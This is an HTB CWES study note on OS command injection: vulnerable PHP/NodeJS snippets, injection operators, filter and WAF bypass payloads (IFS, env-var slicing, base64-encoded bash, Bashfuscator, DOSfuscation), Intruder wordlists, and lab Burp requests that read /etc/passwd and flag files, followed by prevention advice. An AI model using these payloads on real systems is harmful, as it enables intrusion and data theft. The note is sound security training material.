---
tags:
  - CWES
  - HTB
  - cybersecurity
xmind_sheet: "1"
source_file: "CWES.xmind"
---

# Command Injection

## Study Companion

### Prerequisites

Shell fundamentals, HTTP parameters, and client/server validation concepts.

### Learning Outcomes

- Identify input that may reach operating-system commands.
- Test separators, whitespace, encoding, and filter behavior methodically.
- Determine execution context and recommend removal of shell dependence.

### Practice Checkpoint

Confirm execution with one harmless deterministic command and record the shell, user, and filter behavior.

### Related Knowledge Map

- [[Maps/Injection and Code Execution|Injection and Code Execution]]
- [[Study Group Guide|CWES Study Group Guide]]

> [!info] Source
> Converted from the CWES XMind mind map. Topic hierarchy, notes, links, and embedded images were preserved.

## Professional Guidance

### Objective
Assess whether untrusted input reaches operating-system command execution in authorized targets, determine the execution context and practical impact, and provide remediation that removes shell dependence wherever possible.

### Assessment Workflow
1. Map functions likely to invoke backend commands, such as host checks and file operations, and capture the complete request in developer tools or an intercepting proxy.
2. Establish a clean baseline, then test one separator or control character at a time, accounting for URL encoding and Linux/Windows shell differences.
3. Confirm execution with a harmless, deterministic command and distinguish client-side validation, application filtering, and WAF blocking from actual backend behavior.
4. Characterize filters methodically by reducing payloads to individual characters, commands, and whitespace forms; test bypasses only as needed to prove exploitability.
5. Validate impact with least-destructive actions under the web-service account, then stop before unnecessary file, privilege, or availability effects.
6. Review the implementation and server configuration for command-execution APIs, validation, sanitization, service privileges, and filesystem restrictions.

### Key Testing Principles
- Treat browser restrictions as usability controls, not security boundaries; validate the server request directly.
- Preserve exact encoding and shell semantics when comparing operators, whitespace alternatives, variable expansion, quoting, case changes, reversal, or encoded commands.
- Prefer a minimal proof over broad automation, and use obfuscation tools only in the authorized lab scope when simpler tests cannot characterize the control.
- Recommend built-in language functionality, strict allowlist validation, least privilege, and constrained runtime configuration rather than blacklist-only defenses.

### Evidence and Reporting
Record the vulnerable parameter and endpoint, raw baseline and proof requests, decoded payload, observed command output, execution user and platform, filter behavior, and affected function. Explain impact without exposing unrelated sensitive data, include reproducible steps and screenshots or proxy records, and prioritize replacing shell calls before adding validation, sanitization, WAF, and server-hardening layers.

<!-- BEGIN XMIND OUTPUTS -->
## XMind Outputs

> [!output] 🟨 Yellow means output
> The source XMind contains **38 yellow/output topics** in this module.

- [[Outputs/Modules/Command Injection Outputs|Open the verified output list]]
<!-- END XMIND OUTPUTS -->

## Complete Technical Reference

## Exploitation

### Intro

- PHP
  - php can use these function to execute OS command on backend
    - exec, system, shell_exec, passthru, or popen
  - Vulnerable code example
    - <?php  
      if (isset($_GET['filename'])) {  
      system("touch /tmp/" . $_GET['filename'] . ".pdf");  
      }  
      ?>
- NodeJS
  - child_process.exec or child_process.spawn
  - example
    - app.get("/createfile", function(req, res){  
      child_process.exec(`touch /tmp/${req.query.filename}.txt`);  
      })
### Detection

- Host Checker utility that appears to ask us for an IP to check whether it is alive or not:
  - we can confidently guess that the IP we entered is going into a ping command
    - ping -c 1 OUR_INPUT
- Injection Methods
  - **Injection Operator  Injection Character**	**URL-Encoded Character**	**Executed Command**  
    Semicolon             	;	                                  %3b	                                        Both (Powershell only on windows)  
    New Line	                \\n	                                  %0a	                                        Both  
    Background	                &	                                  %26	                                        Both (second output generally shown first)  
    Pipe	                        \|	                                  %7c	                                        Both (only second output is shown)  
    AND	                        &&	                                  %26%26	                                Both (only if first succeeds)  
    OR	                               \|\|	                                  %7c%7c	                                Second (only if first fails)  
    Sub-Shell	                ``	                                  %60%60	                                Both (Linux-only)  
    Sub-Shell	                $()	                                  %24%28%29	                        Both (Linux-only)
### Injecting Command

- Host Checker
  - refused our input,
    - check is the error message from front end or backend
      - Firefox Developer Tools
        - no new network requests were made
          - its Fron-End validation
  - Bypassing Front-End Validation
    - web proxy that can intercept the HTTP requests
      - in Burp in POST parameter
        - Connection: close  
          ip=127.0.0.1%3b+whoami
          - 64 bytes from ...  
            www-data
- Other Injection Operators
  - AND Operator
    - 127.0.0.1 && whoami
      - do URL Encoding for & and space
  - OR Operator
    - 127.0.0.1 || whoami
      - first one must failed to execute the second
        - 1 || whoami
  - injections
    - **Injection Type**	**Operators**  
      SQL Injection	' , ; -- /\* \*/  
      Command Injection	; &&  
      LDAP Injection	\* ( ) & \|  
      XPath Injection	' or and not substring concat count  
      OS Command Injection	; & \|  
      Code Injection	' ; -- /\* \*/ $() ${} #{} %{} ^  
      Directory Traversal/File Path Traversal	../ ..\\\\ %00  
      Object Injection	; & \|  
      XQuery Injection	' ; -- /\* \*/  
      Shellcode Injection	\\x \\u %u %n  
      Header Injection	\\n \\r\\n \\t %0d %0a %09
      - more references in
        - https://academy.hackthebox.com/course/preview/whitebox-pentesting-101-command-injection
  - LAB
    - Which of them only shows the output of the injected command?
      - ip=127.0.0.1+|+whoami
        - www-data
## Filter Evasion

### Identifying Filters

- Filter/WAF Detection
  - if we try the previous operators we tested, like (;, &&, ||), we get the error message invalid input:
    - something we sent triggered a security mechanism
      - This error message can be displayed in various ways. In this case, we see it in the field where the output is displayed,
        - meaning that it was detected and prevented by the PHP web application itself.
        - If the error message displayed a different page, with information like our IP and our request, this may indicate that it was denied by a WAF.
  - we sent:
    - A semi-colon character ;
    - A space character
    - A whoami command
  - So, the web application either detected a blacklisted character or detected a blacklisted command, or both
    - Blacklisted Characters
      > A web application may have a list of blacklisted characters, and if the command contains them, it would deny the request.
      - PHP code
        - $blacklist = ['&', '|', ';', ...SNIP...];  
          foreach ($blacklist as $character) {  
          if (strpos($_POST['ip'], $character) !== false) {  
          echo "Invalid input";  
          }  
          }
          - Identifying Blacklisted Character
            - reduce our request to one character at a time
              - 127.0.0.1;
  - LAB
    - which is not blacklisted
      - new-line
        - ip=127.0.0.1%0d%0a
          - new-line character is usually not blacklisted
        - ip=127.0.0.1%0a
- Bypassing Space Filters
  - Bypass Blacklisted Operators
    - 127.0.0.1%0a whoami
      - Invalid Input
    - ip=127.0.0.1%0a+
      - Invalid Input
        - the space character is indeed blacklisted
    - Using tabs (%09) instead of space
      - 127.0.0.1%0a%09
        - we successfully bypassed the space character
    - Using the ($IFS) Linux Environment Variable
      - default value is a space and a tab
        - 127.0.0.1%0a${IFS}
      - to bypass space blocking
        - ls$IFS/
    - Using Brace Expansion
      - automatically adds spaces between arguments
        - like
          - Rayan@htb[/htb]$ {ls,-la}
        - 127.0.0.1%0a{ls,-la}
      - wordlists
        - PayloadsAllTheThings
          - Command Injection
            - Filter Bypasses
    - Bypassing Other Blacklisted Characters
      - /) or backslash (\\)
    - Linux
      - get blacklist using environment
        - /
          - echo ${PATH}
            - /usr/local/bin:/usr/bin:/bin:/usr/games
              - So, if we start at the 0 character, and only take a string of length 1, we will end up with only the /
                - echo ${PATH:0:1}
                  - /
                    - We can do the same with the $HOME or $PWD
        - ;
          - echo ${LS_COLORS:10:1}
            - ;
        - let's try to use environment variables to add a semi-colon and a space
          - 127.0.0.1${LS_COLORS:10:1}${IFS}
            - successfully bypassed
      - backslash \ and the positional parameter character $@
        - the number of characters do not have to be even
          - who$@ami
    - Windows
      - %HOMEPATH% -> \\Users\\htb-student
        - CMD
          - echo %HOMEPATH:~6,-11%
        - powershell
          - $env:HOMEPATH[0]
            - \\
          - Get-ChildItem Env: PowerShell command to print all environment variables and then pick one of them to produce a character we need.
      - caret (^)
        - who^ami
    - Linux & Windows
      - single-quote ' and a double-quote "
        - obfuscate the whoami command,
          - insert single quotes between its characters
            - w'h'o'am'i
    - Character Shifting
      - in Linux
        - shifts the character we pass by 1. So, all we have to do is find the character in the ASCII table that is just before
          - man ascii
            - # \\ is on 92, before it is [ on 91
              - $ echo $(tr '!-}' '"-~'<<<[)
                - \\
      - PowerShell
        - though they can be quite longer than the Linux ones.
    - LAB
      - Get the users inside of /home
        - ip=127.0.0.1%0a{ls,${PATH:0:1}}
          - this command do
            - new line
            - Seperate space by Bash
            - use environment to bypass /
            - result in executing the command ls /
              - next get the user
                - ip=127.0.0.1%0a{ls,${PATH:0:1}home}
                  - 1nj3c70r
    - LAB2 (updated)
      - Use what you learned in this section find the content of flag.txt in the home folder of the user you previously found.
        - identify success payload
          - ip=127.0.0.1%0aw'h'o'am'i
          - Since its Linux this also work
            - ip=127.0.0.1%0awho$@ami
          - replace /
            - / = ${PATH:0:1}
        - use crafted payload (test in bash)
          - echo {cat,${PATH:0:1}home${PATH:0:1}rayanmewa${PATH:0:1}flag.txt}
            - cat /home/rayanmewa/flag.txt
              - The payload translated into working comand
        - send in burp
          - identify username in /home
            - ip=127.0.0.1%0a{cat,${PATH:0:1}home}
              - 1nj3c70r
          - specify the full path
            - ip=127.0.0.1%0a{cat,${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt}
              - Invalid Command
          - modify the command cat
            - ip=127.0.0.1%0a{ca't',${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt}
              - HTB{b451c_f1l73r5_w0n7_570p_m3}
  - Advanced Command Obfuscation
    - Case Manipulation
      - (e.g. WHOAMI) or alternating between cases (e.g. WhOaMi)
        - explain
          - This usually works because a command blacklist may not check for different case variations of a single word, as Linux systems are case-sensitive.
          - In Windows, commands for PowerShell and CMD are case-insensitive, meaning they will execute the command regardless of what case it is written in:
        - in powershell - Windows
          - PS C:\htb>
            - WhOaMi
              - 21y4d
        - in bash - Linux
          - we have to get a bit creative and find a command that turns the command into an all-lowercase word
            - execute
              - one example
                - $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
                  - 21y4d
              - other command
                - $(a="WhOaMi";printf %s "${a,,}")
      - try to use the above command with the Host Checker web application
        - still gets blocked
          - It is because the command above contains spaces, which is a filtered character
            - we must always be sure not to use any filtered characters
              - replace the spaces + with tabs %09
                - $(tr%09" [A-Z]"%09"[a-z]"<<"WhOaMi" )||
                  - command works perfectly
    - Reversed Commands
      - Linux
        - echo 'whoami' | rev
          - imaohw
        - execute the original command by reversing it back in a sub-shell ($())
          - $(rev<<<'imaohw')
            - 21y4d
          - if pipe | used you have to use eval
            - eval "$(rev<<<'imaohw')" | tail -n 1
              - 21y4d
      - Windows
        - "whoami"[-1..-20] -join ''
          - imaohw
            - execute a reversed string with a PowerShell sub-shell (iex "$()")
              - iex "$('imaohw'[-1..-20] -join '')"
                - 21y4d
    - Encoded Commands
      - base64
        - Linux
          - echo 'cat /etc/passwd | grep 33' | base64
          - echo -n 'cat /etc/passwd | grep 33' | base64
            - Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
              - echo "L3Vzci9zaGFyZS8gfCBncmVwIHJvb3QgfCBncmVwIG15c3FsIHwgdGFpbCAtbiAx" | base64 -d
              - execute
                - create a command that will decode the encoded string in a sub-shell ($())
                  - bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
                    - www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
                      - if some commands were filtered, like bash or base64
                        - use other alternatives like sh for command execution and openssl for b64 decoding, or xxd
          - echo -n whoami | iconv -f utf-8 -t utf-16le | base64
            - dwBoAG8AYQBtAGkA
        - Windows
          - [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
            - dwBoAG8AYQBtAGkA
              - decode the b64 string and execute it with a PowerShell sub-shell (iex "$()"
                - iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
                  - 21y4d
      - xxd for hex decoding.
      - numerous other methods
        - wildcards
        - regex
        - output redirection
        - integer expansion
        - <https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-with-variable-expansion>
    - LAB
      - Find the output of the following command using one of the techniques you learned in this section: find /usr/share/ | grep root | grep mysql | tail -n 1
        - Payloads wordlist
          - whoami  
            WhOaMi  
            WhOaMI  
            $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")  
            $(a="WhOaMi";printf %s "${a,,}")  
            $(a="WhOaMi";printf%09%s%09"${a,,}")  
            $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")  
            $(tr%09" [A-Z]"%09"[a-z]"<<"WhOaMi" )||  
            d2hvYW1pCg==  
            Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==  
            bash<<<$(base64 -d<<<d2hvYW1pCg==)  
            bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
            - replace the space into %09 (TAB) and add it to the list
              - sed 's/ /%09/g' payloads
                - prepared payloads
                  - whoami  
                    $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")  
                    $(a="WhOaMi";printf %s "${a,,}")  
                    $(a="WhOaMi";printf%09%s%09"${a,,}")  
                    $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")  
                    $(tr%09" [A-Z]"%09"[a-z]"<<"WhOaMi" )||  
                    bash<<<$(base64 -d<<<d2hvYW1pCg==)  
                    bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)  
                    $(a="WhOaMi";printf%09%s%09"${a,,}")  
                    $(a="WhOaMi";printf%09%s%09"${a,,}")  
                    $(tr%09"[A-Z]"%09"[a-z]"<<<"WhOaMi")  
                    $(tr%09"%09[A-Z]"%09"[a-z]"<<"WhOaMi"%09)||  
                    bash<<<$(base64%09-d<<<d2hvYW1pCg==)  
                    bash<<<$(base64%09-d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
        - run in intruder
          - add %0a as prefix for the payloads
            - found result with these payloads
              - $(tr%09"[A-Z]"%09"[a-z]"<<<"WhOaMi")
                - in burp
                  - ip=127.0.0.1%0a$(tr%09%22[A-Z]%22%09%22[a-z]%22%3c%3c%3c%22WhOaMi%22)
              - bash<<<$(base64%09-d<<<d2hvYW1pCg==)
                - ip=127.0.0.1%0abash%3c%3c%3c$(base64%09-d%3c%3c%3cd2hvYW1pCg%3d%3d)
              - bash<<<$(base64%09-d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
                - ip=127.0.0.1%0abash%3c%3c%3c$(base64%09-d%3c%3c%3cY2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw%3d%3d)
        - use command find to get the file name
          - ls is not usabale at all
          - echo 'find /usr/share/ | grep root | grep mysql | tail -n 1' | base64
            - ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=
              - bypass the space
                - sed 's/ /%09/g' payloads
                  - execute it using
                    - bash<<<$(base64%09-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)
                      - in burp
                        - ip=127.0.0.1%0abash%3c%3c%3c$(base64%09-d%3c%3c%3cZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE%3d)
                          - /usr/share/mysql/debian_create_root_user.sql
  - Evasion Tools
    - Linux (Bashfuscator)
      - <https://github.com/Bashfuscator/Bashfuscator>
        - git clone https://github.com/Bashfuscator/Bashfuscator
          - cd Bashfuscator
            - pip3 install setuptools==65
              - python3 setup.py install --user
                - Once we have the tool set up, we can start using it from the ./bashfuscator/bin/
      - cd ./bashfuscator/bin/
        - ./bashfuscator -h
      - ./bashfuscator -c 'cat /etc/passwd'
        - [+] Mutators used: Token/ForCode -> Command/Reverse  
          [+] Payload:  
          ${*/+27\[X\(} ...SNIP...  ${*~}
          - running the tool this way will randomly pick an obfuscation technique
            - which can output a command length ranging from a few hundred characters to over a million characters!
        - produce a shorter and simpler obfuscated command
          - ./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
            - eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"
              - bash -c 'eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"'
                - root:x:0:0:root:/root:/bin/bash
          - ./bashfuscator -c 'whoami' -s 1 -t 1 --no-mangling --layers 1
            - printf %s "$(DO=(w i o m h a);for xp in 0 4 2 5 3 1;do printf %s "${DO[$xp]}";done;)"|bash
              - rayan
    - Windows (DOSfuscation)
      - <https://github.com/danielbohannon/Invoke-DOSfuscation>
        - git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
          - cd Invoke-DOSfuscation
            - Import-Module .\Invoke-DOSfuscation.psd1
      - Invoke-DOSfuscation
        - Invoke-DOSfuscation>
          - help
            - [*] BINARY      Obfuscated binary syntax for cmd.exe & powershell.exe  
              [*] ENCODING    Environment variable encoding  
              [*] PAYLOAD     Obfuscated payload via DOSfuscation
          - SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
            - encoding
              - 1
                - Result:  
                  typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt
          - SET COMMAND whoami
            - encoding
              - 1
                - Result:  
                  wh%SystemRoot:~7,1%ami
      - we can try running the obfuscated command on CMD
        - C:\htb> typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt
          - test_flag
            - If we do not have access to a Windows VM, we can run the above code on a Linux VM through pwsh. Run pwsh,
## Prevention

### System Commands

- We should always avoid using functions that execute system commands, especially if we are using user input with them
- we should use built-in functions that perform the needed functionality, as back-end languages usually have secure implementations of these types of functionalities.
### Input Validation

- PHP
  - like many other web development languages, there are built in filters for a variety of standard formats, like emails, URLs, and even IPs, which can be used with the filter_var function
    - code
      - if (filter_var($_GET['ip'], FILTER_VALIDATE_IP)) {  
        // call function  
        } else {  
        // deny request  
        }
  - validate a different non-standard format
    - Regular Expression regex with the preg_match function.
- NodeJS
  - code
    - if(/^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(ip)){  
      // call function  
      }  
      else{  
      // deny request  
      }
- libraries
  - <https://www.npmjs.com/package/is-ip>
    - we can install with npm
### Input Sanitization

- use built-in functions to remove any special characters.
- We can use preg_replace to remove any special characters from the user input
  - php
    - $ip = preg_replace('/[^A-Za-z0-9.]/', '', $_GET['ip']);
  - javascript
    - var ip = ip.replace(/[^A-Za-z0-9.]/g, '');
  - NodeJS
    - DOMPurify
      - import DOMPurify from 'dompurify';  
        var ip = DOMPurify.sanitize(ip);
- In certain cases, we may want to allow all special characters (e.g., user comments),
  - filter_var function we used with input validation, and use the escapeshellcmd filter to escape any special characters
### Server Configuration

- Web Application Firewall
- <https://en.wikipedia.org/wiki/Principle_of_least_privilege>
  - e.g. www-data
- Prevent certain functions from being executed by the web server
  - e.g., in PHP disable_functions=system,...
- Limit the scope accessible by the web application to its folder
  - (e.g. in PHP open_basedir = '/var/www/html'
    - Reject double-encoded requests and non-ASCII characters in URLs
- Avoid the use of sensitive/outdated libraries and modules (e.g. PHP CGI)
## Skills Assessment

### investigate the web

- Move functionality said (Malicious input found)
  - seems vulnerable
    - prepare wordlists
      - prefix
        - %3b  
          %0a  
          %26  
          %7c  
          %26%26  
          %7c%7c  
          %60%60  
          %24%28%29
      - paylaods
        - whoami  
          $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")  
          $(a="WhOaMi";printf %s "${a,,}")  
          $(a="WhOaMi";printf%09%s%09"${a,,}")  
          $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")  
          $(tr%09" [A-Z]"%09"[a-z]"<<"WhOaMi" )||  
          bash<<<$(base64 -d<<<d2hvYW1pCg==)  
          bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)  
          $(a="WhOaMi";printf%09%s%09"${a,,}")  
          $(a="WhOaMi";printf%09%s%09"${a,,}")  
          $(tr%09"[A-Z]"%09"[a-z]"<<<"WhOaMi")  
          $(tr%09"%09[A-Z]"%09"[a-z]"<<"WhOaMi"%09)||  
          bash<<<$(base64%09-d<<<d2hvYW1pCg==)  
          bash<<<$(base64%09-d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)  
          bash -c 'eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"'  
          printf %s "$(DO=(w i o m h a);for xp in 0 4 2 5 3 1;do printf %s "${DO[$xp]}";done;)"|bash
### use intruder

- Payload Proccess
  - Match and replace
    - replace [ ]with [%09]
- found results
  - %26
    - bash<<<$(base64%09-d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
    - $(tr%09" [A-Z]"%09"[a-z]"<<"WhOaMi" )
### final Burp Request

- GET /index.php?to=tmp%26$(tr%09%22[A-Z]%22%09%22[a-z]%22%3c%3c%3c%22WhOaMi%22)&from=787113764.txt&finish=1&move=1 HTTP/1.1
  - GET /index.php?to=tmp%26$(tr%09%22[A-Z]%22%09%22[a-z]%22%3c%3c%3c%22CAT%09${PATH:0:1}flag.txt%22)&from=787113764.txt&finish=1&move=1 HTTP/1.1
